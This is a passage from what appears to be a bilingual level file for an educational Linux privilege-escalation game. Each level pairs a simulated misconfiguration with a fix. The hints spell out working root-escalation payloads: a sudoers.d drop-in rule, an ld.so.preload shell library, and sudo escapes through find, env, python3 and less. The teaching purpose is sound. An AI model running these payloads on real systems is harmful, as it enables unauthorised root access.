            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt', '.ssh'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{r00t_ssh_key_l00t}\n' },
            '/root/.ssh': { type: 'dir', owner: 'root', mode: '700', children: ['authorized_keys'] },
            '/root/.ssh/authorized_keys': { type: 'file', owner: 'root', mode: '600', content: 'ssh-rsa AAAAB3NzaC1yc2E...backup-key root@box-13\n' },
            '/opt': { type: 'dir', owner: 'root', mode: '755', children: ['backup'] },
            '/opt/backup': { type: 'dir', owner: 'root', mode: '755', children: ['id_rsa', 'id_rsa.pub', 'README'] },
            '/opt/backup/id_rsa': { type: 'file', owner: 'root', mode: '644', content:
`-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gt
ZW3vYmFja3VwLWtleS1sZWFrZWQtZG8tbm90LXVzZS1pbi1wcm9kAAAAAAECAwQF
-----END OPENSSH PRIVATE KEY-----
` },
            '/opt/backup/id_rsa.pub': { type: 'file', owner: 'root', mode: '644', content: 'ssh-rsa AAAAB3NzaC1yc2E...backup-key root@box-13\n' },
            '/opt/backup/README': { type: 'file', owner: 'root', mode: '644', content: 'Nightly key backup. TODO: fix perms (currently world-readable!).\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'ssh'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/bash': ELF_BIN(),
            '/usr/bin/ssh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        wins: [
            { type: 'ssh_key' }
        ],
        debrief: {
            en: {
                vuln: 'World-readable root SSH private key',
                why: 'A backup job copied root\'s private key to /opt/backup and left it world-readable. Because /root/.ssh/authorized_keys trusts the matching public key, anyone who can read the private key can authenticate as root over SSH — no password, no exploit.',
                fix: 'Private keys must be 600 and owned by their user; never copy them to shared/backup locations in cleartext. Encrypt backups, rotate any exposed key immediately, and audit file permissions on key material.',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reading-root-ssh-keys'
            },
            fr: {
                vuln: 'Clé privée SSH de root lisible par tous',
                why: 'Une sauvegarde a copié la clé privée de root dans /opt/backup en la laissant lisible par tous. Comme /root/.ssh/authorized_keys fait confiance à la clé publique correspondante, quiconque peut lire la clé privée s\'authentifie en root via SSH — sans mot de passe ni exploit.',
                fix: 'Les clés privées doivent être en 600 et appartenir à leur utilisateur ; ne jamais les copier en clair dans des emplacements partagés/de sauvegarde. Chiffre les sauvegardes, révoque immédiatement toute clé exposée, et audite les permissions du matériel de clés.',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reading-root-ssh-keys'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 14 — Writable /etc/sudoers.d drop-in
    // ─────────────────────────────────────────────────────────────
    {
        id: 14,
        codename: 'box-14',
        title: { en: 'Box-14 · Drop-in Privilege', fr: 'Box-14 · Privilège en drop-in' },
        brief: {
            en: 'The /etc/sudoers.d directory is world-writable. sudo honours every rule dropped there — so write your own.',
            fr: 'Le dossier /etc/sudoers.d est modifiable par tous. sudo applique toute règle qu\'on y dépose — écris donc la tienne.'
        },
        user: 'player',
        host: 'box-14',
        cwd: '/home/player',
        objectives: {
            en: ['Notice /etc/sudoers.d is writable', 'Drop a NOPASSWD rule for yourself', 'Use sudo to get a root shell'],
            fr: ['Repérer que /etc/sudoers.d est modifiable', 'Déposer une règle NOPASSWD pour toi', 'Utiliser sudo pour un shell root']
        },
        hints: {
            en: [
                'ls -la /etc/sudoers.d — the directory is world-writable, and sudo reads every file inside it.',
                "Drop a rule granting yourself everything:\n  echo 'player ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/pwn",
                'Now escalate:\n  sudo bash'
            ],
            fr: [
                'ls -la /etc/sudoers.d — le dossier est modifiable par tous, et sudo lit chaque fichier dedans.',
                "Dépose une règle qui t'accorde tout :\n  echo 'player ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/pwn",
                'Puis escalade :\n  sudo bash'
            ]
        },
        flag: 'flag{sud0ers_d_dr0pin}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'sudoers', 'sudoers.d'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
            '/etc/sudoers.d': { type: 'dir', owner: 'root', mode: '777', writable_by_all: true, children: ['README'] },
            '/etc/sudoers.d/README': { type: 'file', owner: 'root', mode: '644', content: '# Drop-in sudoers snippets go here.\n# (Directory perms are wrong — it is world-writable!)\n' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{sud0ers_d_dr0pin}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'sudo'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/bash': ELF_BIN(),
            '/usr/bin/sudo': SUID_BIN(),
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        wins: [
            { type: 'sudo_shell' }
        ],
        harden: {
            type: 'lock_perms', target: '/etc/sudoers.d',
            obj: { en: 'Fix the permissions on /etc/sudoers.d (755)', fr: 'Corrige les permissions de /etc/sudoers.d (755)' },
            hint: { en: 'chmod 755 /etc/sudoers.d', fr: 'chmod 755 /etc/sudoers.d' }
        },
        debrief: {
            en: {
                vuln: 'World-writable /etc/sudoers.d directory',
                why: 'sudo includes every file in /etc/sudoers.d. Because the directory was world-writable, any user could drop a file granting themselves NOPASSWD: ALL and immediately run a root shell — no exploit, just a misconfigured permission.',
                fix: 'The /etc/sudoers.d directory and its files must be owned by root and mode 755 / 440. Audit sudo drop-ins, validate with visudo -c, and alert on any write to sudoers paths.',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid'
            },
            fr: {
                vuln: 'Dossier /etc/sudoers.d modifiable par tous',
                why: 'sudo inclut chaque fichier de /etc/sudoers.d. Le dossier étant modifiable par tous, n\'importe qui pouvait y déposer un fichier s\'octroyant NOPASSWD: ALL et ouvrir aussitôt un shell root — sans exploit, juste une permission mal configurée.',
                fix: 'Le dossier /etc/sudoers.d et ses fichiers doivent appartenir à root en mode 755 / 440. Audite les drop-ins sudo, valide avec visudo -c, et alerte sur toute écriture dans les chemins sudoers.',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 15 — Writable /etc/ld.so.preload
    // ─────────────────────────────────────────────────────────────
    {
        id: 15,
        codename: 'box-15',
        title: { en: 'Box-15 · Preload, Globally', fr: 'Box-15 · Préchargement global' },
        brief: {
            en: '/etc/ld.so.preload injects a library into every dynamically linked program — including SUID root ones. It is writable here.',
            fr: '/etc/ld.so.preload injecte une bibliothèque dans chaque programme lié dynamiquement — y compris les SUID root. Il est modifiable ici.'
        },
        user: 'player',
        host: 'box-15',
        cwd: '/home/player',
        objectives: {
            en: ['Spot the writable /etc/ld.so.preload', 'Build a library that pops a root shell', 'Trigger it via any SUID binary'],
            fr: ['Repérer /etc/ld.so.preload modifiable', 'Construire une bibliothèque qui ouvre un shell root', 'La déclencher via un binaire SUID']
        },
        hints: {
            en: [
                'ls -la /etc/ld.so.preload — world-writable. Every SUID binary loads whatever it lists.',
                'Build the library and register it:\n  echo \'void _init(){setuid(0);system("/bin/sh");}\' > /tmp/x.c\n  gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c\n  echo /tmp/x.so > /etc/ld.so.preload',
                'Trigger it by running any SUID binary:\n  /usr/bin/passwd'
            ],
            fr: [
                'ls -la /etc/ld.so.preload — modifiable par tous. Chaque binaire SUID charge ce qu\'il liste.',
                'Construis la bibliothèque et enregistre-la :\n  echo \'void _init(){setuid(0);system("/bin/sh");}\' > /tmp/x.c\n  gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c\n  echo /tmp/x.so > /etc/ld.so.preload',
                'Déclenche-la en lançant un binaire SUID :\n  /usr/bin/passwd'
            ]
        },
        flag: 'flag{ld_s0_preload_glob4l}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'ld.so.preload'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/ld.so.preload': { type: 'file', owner: 'root', mode: '666', writable_by_all: true, content: '' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{ld_s0_preload_glob4l}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'gcc', 'passwd'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/bash': ELF_BIN(),
            '/usr/bin/gcc': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/passwd': { type: 'file', owner: 'root', mode: '4755', suid: true, content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        wins: [
            { type: 'ld_so_preload' }
        ],
        harden: {
            type: 'lock_perms', target: '/etc/ld.so.preload',
            obj: { en: 'Remove write access to /etc/ld.so.preload (644)', fr: 'Retire l\'accès en écriture à /etc/ld.so.preload (644)' },
            hint: { en: 'chmod 644 /etc/ld.so.preload', fr: 'chmod 644 /etc/ld.so.preload' }
        },
        debrief: {
            en: {
                vuln: 'World-writable /etc/ld.so.preload',
                why: 'The dynamic linker preloads every library listed in /etc/ld.so.preload into all dynamically linked programs, SUID root ones included. With the file world-writable, an attacker points it at a malicious .so whose constructor runs setuid(0)/system — the next SUID binary executes it as root.',
                fix: '/etc/ld.so.preload must be root-owned and mode 644 (or absent). Monitor it for changes, and audit SUID binaries. Consider mounting sensitive config read-only or using a MAC policy (AppArmor/SELinux).',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation'
            },
            fr: {
                vuln: '/etc/ld.so.preload modifiable par tous',
                why: 'Le linker dynamique précharge chaque bibliothèque listée dans /etc/ld.so.preload dans tous les programmes liés dynamiquement, y compris les SUID root. Le fichier étant modifiable par tous, un attaquant le pointe vers un .so malveillant dont le constructeur fait setuid(0)/system — le prochain binaire SUID l\'exécute en root.',
                fix: '/etc/ld.so.preload doit appartenir à root en mode 644 (ou être absent). Surveille ses modifications, audite les binaires SUID, et envisage un montage en lecture seule ou une politique MAC (AppArmor/SELinux).',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 16 — sudo NOPASSWD on find (GTFOBins, distinct from box-01's SUID vector)
    // ─────────────────────────────────────────────────────────────
    {
        id: 16,
        codename: 'box-16',
        title: { en: 'Box-16 · Find, Reprised', fr: 'Box-16 · Find, la reprise' },
        brief: {
            en: 'sudo lets you run find as root this time — no SUID bit needed. Same binary, same trick, different door.',
            fr: 'Cette fois sudo t\'autorise find en root — pas besoin de bit SUID. Même binaire, même astuce, porte différente.'
        },
        user: 'player',
        host: 'box-16',
        cwd: '/home/player',
        objectives: {
            en: ['Check your sudo permissions', 'Recall the find -exec trick from GTFOBins', 'Spawn a root shell'],
            fr: ['Vérifier tes droits sudo', 'Te rappeler l\'astuce find -exec de GTFOBins', 'Ouvrir un shell root']
        },
        hints: {
            en: [
                'Try: sudo -l',
                'sudo find works the same way SUID find did — GTFOBins lists it as a shell-spawning binary either way.',
                'Payload: sudo find . -exec /bin/sh \\;'
            ],
            fr: [
                'Essaie : sudo -l',
                'sudo find fonctionne comme le find SUID — GTFOBins le liste comme binaire capable d\'ouvrir un shell dans les deux cas.',
                'Payload : sudo find . -exec /bin/sh \\;'
            ]
        },
        flag: 'flag{sud0_find_rebo0t}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'sudoers'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{sud0_find_rebo0t}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'sudo', 'find'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/bash': ELF_BIN(),
            '/usr/bin/sudo': SUID_BIN(),
            '/usr/bin/find': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        sudoers: {
            player: [
                { cmd: '/usr/bin/find', nopasswd: true, runas: 'root' }
            ]
        },
        wins: [
            { type: 'sudo_shell' }
        ],
        debrief: {
            en: {
                vuln: 'Sudoers misconfiguration — NOPASSWD on find',
                why: "Whether find gets its power from a SUID bit or a sudo rule, the outcome is identical: -exec lets it launch an arbitrary program, and that program inherits root. The delivery mechanism differs, but GTFOBins' advice is the same either way.",
                fix: 'Never grant sudo on general-purpose file tools. If find must run as root for a specific task, wrap it in a script with fixed arguments and no -exec/-delete, and reference GTFOBins before writing any sudoers rule.',
                link: 'https://gtfobins.github.io/gtfobins/find/'
            },
            fr: {
                vuln: 'Mauvaise config sudoers — NOPASSWD sur find',
                why: "Que find tienne sa puissance d'un bit SUID ou d'une règle sudo, le résultat est identique : -exec lui permet de lancer un programme arbitraire, qui hérite des droits root. Le vecteur diffère, le conseil GTFOBins reste le même.",
                fix: 'Ne jamais donner sudo sur un outil de fichiers généraliste. Si find doit tourner en root pour une tâche précise, encapsule-le dans un script à arguments figés, sans -exec/-delete, et vérifie GTFOBins avant d\'écrire la moindre règle sudoers.',
                link: 'https://gtfobins.github.io/gtfobins/find/'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 17 — sudo NOPASSWD on env (GTFOBins)
    // ─────────────────────────────────────────────────────────────
    {
        id: 17,
        codename: 'box-17',
        title: { en: 'Box-17 · Environmentally Unfriendly', fr: 'Box-17 · Environnement hostile' },
        brief: {
            en: 'sudo lets you run env as root. env can launch any program you hand it — including a shell.',
            fr: 'sudo t\'autorise env en root. env peut lancer n\'importe quel programme qu\'on lui passe — y compris un shell.'
        },
        user: 'player',
        host: 'box-17',
        cwd: '/home/player',
        objectives: {
            en: ['Check your sudo permissions', 'Recognise env on GTFOBins', 'Use it to launch a root shell'],
            fr: ['Vérifier tes droits sudo', 'Reconnaître env sur GTFOBins', 'L\'utiliser pour lancer un shell root']
        },
        hints: {
            en: [
                'Try: sudo -l',
                'env normally sets environment variables then runs a command. Give it a shell instead. Check GTFOBins for "env".',
                'Payload: sudo env /bin/sh'
            ],
            fr: [
                'Essaie : sudo -l',
                'env sert normalement à poser des variables d\'environnement puis lancer une commande. Donne-lui un shell à la place. Regarde GTFOBins pour "env".',
                'Payload : sudo env /bin/sh'
            ]
        },
        flag: 'flag{env_v4r_r00t}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'sudoers'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{env_v4r_r00t}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'sudo', 'env'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/bash': ELF_BIN(),
            '/usr/bin/sudo': SUID_BIN(),
            '/usr/bin/env': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        sudoers: {
            player: [
                { cmd: '/usr/bin/env', nopasswd: true, runas: 'root' }
            ]
        },
        wins: [
            { type: 'sudo_shell' }
        ],
        debrief: {
            en: {
                vuln: 'Sudoers misconfiguration — NOPASSWD on env',
                why: "env's whole job is to run a command with a modified environment. sudo env /bin/sh skips the environment tweak and just runs /bin/sh — as root, since that's who sudo made env run as.",
                fix: 'Never grant sudo on env, or on any wrapper capable of launching an arbitrary program. If a script legitimately needs env, invoke it directly with a hard-coded target instead of exposing sudo to the raw binary.',
                link: 'https://gtfobins.github.io/gtfobins/env/'
            },
            fr: {
                vuln: 'Mauvaise config sudoers — NOPASSWD sur env',
                why: "Le rôle d'env est de lancer une commande avec un environnement modifié. sudo env /bin/sh saute la modification et lance simplement /bin/sh — en root, puisque c'est sous cette identité que sudo a fait tourner env.",
                fix: 'Ne jamais donner sudo sur env, ni sur un wrapper capable de lancer un programme arbitraire. Si un script a légitimement besoin d\'env, appelle-le directement avec une cible figée plutôt que d\'exposer sudo sur le binaire brut.',
                link: 'https://gtfobins.github.io/gtfobins/env/'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 18 — sudo NOPASSWD on python3 (GTFOBins)
    // ─────────────────────────────────────────────────────────────
    {
        id: 18,
        codename: 'box-18',
        title: { en: 'Box-18 · The Interpreter\'s Gambit', fr: 'Box-18 · Le gambit de l\'interpréteur' },
        brief: {
            en: 'sudo lets you run python3 as root. Any interpreter that can shell out is a root shell in disguise.',
            fr: 'sudo t\'autorise python3 en root. Tout interpréteur capable d\'ouvrir un shell est un shell root déguisé.'
        },
        user: 'player',
        host: 'box-18',
        cwd: '/home/player',
        objectives: {
            en: ['Check your sudo permissions', 'Use python3\'s os.system to spawn a shell', 'Confirm root'],
            fr: ['Vérifier tes droits sudo', 'Utiliser os.system de python3 pour ouvrir un shell', 'Confirmer root']
        },
        hints: {
            en: [
                'Try: sudo -l',
                'python3 -c lets you run arbitrary Python. os.system() shells out. Check GTFOBins for "python".',
                'Payload: sudo python3 -c \'import os; os.system("/bin/sh")\''
            ],
            fr: [
                'Essaie : sudo -l',
                'python3 -c exécute du Python arbitraire. os.system() ouvre un shell. Regarde GTFOBins pour "python".',
                'Payload : sudo python3 -c \'import os; os.system("/bin/sh")\''
            ]
        },
        flag: 'flag{pyth0n_0s_syst3m}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'sudoers'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{pyth0n_0s_syst3m}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'sudo', 'python3'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/bash': ELF_BIN(),
            '/usr/bin/sudo': SUID_BIN(),
            '/usr/bin/python3': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        sudoers: {
            player: [
                { cmd: '/usr/bin/python3', nopasswd: true, runas: 'root' }
            ]
        },
        wins: [
            { type: 'sudo_shell' }
        ],
        debrief: {
            en: {
                vuln: 'Sudoers misconfiguration — NOPASSWD on python3',
                why: 'python3 -c runs arbitrary code, and os.system() calls straight into the shell. sudo grants that code root, so a one-liner is enough to get a root shell — the same pattern applies to perl, ruby, and any other scripting interpreter.',
                fix: 'Never grant sudo on a general-purpose interpreter. If a Python script must run as root, ship it as a fixed, reviewed script — never as sudo access to the interpreter itself.',
                link: 'https://gtfobins.github.io/gtfobins/python/'
            },
            fr: {
                vuln: 'Mauvaise config sudoers — NOPASSWD sur python3',
                why: 'python3 -c exécute du code arbitraire, et os.system() appelle directement le shell. sudo donne les droits root à ce code : un one-liner suffit pour un shell root — le même schéma s\'applique à perl, ruby et tout autre interpréteur de script.',
                fix: 'Ne jamais donner sudo sur un interpréteur généraliste. Si un script Python doit tourner en root, livre-le comme script figé et revu — jamais comme un accès sudo à l\'interpréteur lui-même.',
                link: 'https://gtfobins.github.io/gtfobins/python/'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 19 — sudo NOPASSWD on less (GTFOBins pager escape)
    // ─────────────────────────────────────────────────────────────
    {
        id: 19,
        codename: 'box-19',
        title: { en: 'Box-19 · Pager, Interrupted', fr: 'Box-19 · Le pager interrompu' },
        brief: {
            en: 'sudo lets you run the less pager as root. Pagers let you shell out to run other commands mid-view.',
            fr: 'sudo t\'autorise le pager less en root. Les pagers laissent lancer d\'autres commandes en cours de lecture.'
        },
        user: 'player',
        host: 'box-19',
        cwd: '/home/player',
        objectives: {
            en: ['Check your sudo permissions', 'Recall the pager shell-escape trick', 'Spawn a root shell'],
            fr: ['Vérifier tes droits sudo', 'Te rappeler l\'astuce d\'échappement des pagers', 'Ouvrir un shell root']
        },
        hints: {
            en: [
                'Try: sudo -l',
                'In a real terminal you\'d open less, press "!" and type /bin/sh to shell out. Check GTFOBins for "less".',
                'This simulator reproduces the escape directly on one line: sudo less !/bin/sh'
            ],
            fr: [
                'Essaie : sudo -l',
                'Dans un vrai terminal, tu ouvrirais less, taperais "!" puis /bin/sh pour sortir vers un shell. Regarde GTFOBins pour "less".',
                'Ce simulateur reproduit l\'échappement directement sur une ligne : sudo less !/bin/sh'
            ]
        },
        flag: 'flag{l3ss_is_r00t}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'sudoers'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{l3ss_is_r00t}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'sudo', 'less'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/bash': ELF_BIN(),
            '/usr/bin/sudo': SUID_BIN(),
            '/usr/bin/less': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        sudoers: {
            player: [
                { cmd: '/usr/bin/less', nopasswd: true, runas: 'root' }
            ]
        },
        wins: [
            { type: 'sudo_shell' }
        ],
        debrief: {
            en: {
                vuln: 'Sudoers misconfiguration — NOPASSWD on less',
                why: 'less (like more, man, and most pagers) supports a "!command" shell-escape so you can run a quick command without leaving the viewer. Under sudo, that escaped command runs as root — an instant root shell from a program whose only job is supposed to be showing text.',
                fix: 'Never grant sudo on a pager or viewer. If a user genuinely needs to page through root-owned logs, use a restricted wrapper (or sudoedit-style tooling) instead of raw sudo access to less/more/man.',
                link: 'https://gtfobins.github.io/gtfobins/less/'
            },
            fr: {
                vuln: 'Mauvaise config sudoers — NOPASSWD sur less',
                why: 'less (comme more, man et la plupart des pagers) propose un échappement shell "!commande" pour lancer une commande rapide sans quitter la visionneuse. Sous sudo, cette commande échappée tourne en root — un shell root instantané depuis un programme censé seulement afficher du texte.',
